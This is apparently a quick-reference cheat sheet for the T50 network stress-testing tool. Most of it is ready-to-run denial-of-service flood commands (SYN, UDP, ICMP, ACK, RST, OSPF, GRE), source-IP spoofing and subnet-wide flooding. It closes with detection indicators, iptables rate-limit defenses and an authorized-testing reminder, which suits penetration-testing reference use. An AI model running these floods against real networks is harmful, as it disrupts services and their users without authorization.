# T50 Quick Reference

## Installation

```bash
sudo apt install t50
# OR
git clone https://gitlab.com/fredericopissarra/t50.git && cd t50 && make && sudo make install
```

## Basic Commands

| Command | Description |
|---------|-------------|
| `t50 <ip>` | Default test (1000 packets) |
| `t50 --flood <ip>` | Flood mode |
| `t50 --threshold 50000 <ip>` | Custom packet count |
| `t50 -l` | List all protocols |
| `t50 --flood --protocol T50 <ip>` | All protocols |
| `t50 --flood --turbo <ip>` | Maximum performance |

## Supported Protocols

```
TCP, UDP, ICMP, IGMPv2, IGMPv3, EGP, DCCP,
RSVP, RIPv1, RIPv2, GRE, ESP, AH, EIGRP, OSPF
```

## Common Attack Patterns

### SYN Flood
```bash
t50 --flood --syn -p 80 192.168.1.1
```

### UDP Flood
```bash
t50 --flood --protocol UDP -p 53 192.168.1.1
```

### ICMP Flood
```bash
t50 --flood --protocol ICMP 192.168.1.1
```

### ACK Flood
```bash
t50 --flood --ack -p 80 192.168.1.1
```

### RST Flood
```bash
t50 --flood --rst -p 80 192.168.1.1
```

### OSPF Attack
```bash
t50 --flood --protocol OSPF 192.168.1.1
```

### GRE Tunnel Flood
```bash
t50 --flood --protocol GRE 192.168.1.1
```

## Quick Options

```
--flood              # Flood mode
--turbo              # Max performance
--shuffle            # Randomize protocol order
--encapsulated       # GRE encapsulation
--saddr <ip>         # Source IP (spoof)
--protocol <proto>   # Specific protocol
-p, --dport <port>   # Destination port
--sport <port>       # Source port
-q, --quiet          # Suppress output
```

## TCP Flags Reference

| Flag | Option | Effect |
|------|--------|--------|
| SYN | `--syn` | Connection initiation |
| ACK | `--ack` | Acknowledgment |
| RST | `--rst` | Reset connection |
| FIN | `--fin` | Graceful close |
| PSH | `--psh` | Push data |
| URG | `--urg` | Urgent data |
| ECE | `--ece` | ECN capable |
| CWR | `--cwr` | Congestion reduced |

## Source Spoofing

```bash
# Random source (default)
t50 --flood 192.168.1.1

# Specific spoofed source
t50 --flood --saddr 10.0.0.100 192.168.1.1
```

## CIDR Range Testing

```bash
# Test entire subnet
t50 --threshold 1000 192.168.1.0/24

# Class C network
t50 --flood 10.0.0.0/24
```

## System Requirements

- Root/sudo privileges
- Linux/Unix system
- Raw socket support
- Multi-core CPU for high rates

## Detection Indicators

- High packet rate from single source
- Mixed protocol traffic patterns
- Spoofed source addresses
- Unusual TCP flag combinations

## Defense Quick Fixes

```bash
# SYN flood protection
iptables -A INPUT -p tcp --syn -m limit --limit 100/s -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# ICMP rate limit
iptables -A INPUT -p icmp -m limit --limit 10/s -j ACCEPT
iptables -A INPUT -p icmp -j DROP

# Block fragments
iptables -A INPUT -f -j DROP
```

## Legal Reminder

**Authorized testing only!** T50 can cause network disruption. Always obtain written permission before testing.
